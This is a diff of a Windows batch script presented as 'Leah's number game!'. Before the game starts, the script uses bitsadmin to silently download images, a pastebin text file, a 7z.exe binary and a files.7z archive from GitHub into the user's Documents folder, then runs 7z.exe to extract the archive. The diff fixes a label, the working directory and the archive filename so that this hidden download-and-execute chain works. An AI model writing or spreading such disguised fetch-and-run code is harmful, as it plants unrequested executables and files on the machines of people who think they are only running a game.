@@ -18,14 +18,15 @@ bitsadmin.exe /transfer "Seinfeld Two" https://i.imgur.com/zClGWxl.jpg %UserProf
 IF EXIST %UserProfile%\Documents\seinfield3.jpg GOTO t1
 bitsadmin.exe /transfer "Seinfeld Three" https://i.imgur.com/tVJDKnF.jpg %UserProfile%\Documents\seinfield3.jpg
 :t1
-IF EXIST %UserProfile%\Documents\trophy.txt GOTO skip
+IF EXIST %UserProfile%\Documents\trophy.txt GOTO zip
 bitsadmin.exe /transfer "Trophy" https://pastebin.com/raw/hbP6Wn2Z %UserProfile%\Documents\trophy.txt
 :zip
 IF EXIST %UserProfile%\Documents\documents.7z GOTO 7z
 bitsadmin.exe /transfer "7z.exe" https://github.com/Leeaah/numbergame2/raw/master/Numbergame/7z.exe %UserProfile%\Documents\7z.exe
 :7z
+cd %UserProfile%\Documents
 bitsadmin.exe /transfer "documents" https://github.com/Leeaah/numbergame2/raw/master/Numbergame/files.7z %UserProfile%\Documents\files.7z
-"%UserProfile%\Documents\7z.exe" x file.7z
+"%UserProfile%\Documents\7z.exe" x files.7z
 :skip
 Title Leah's number game!
 
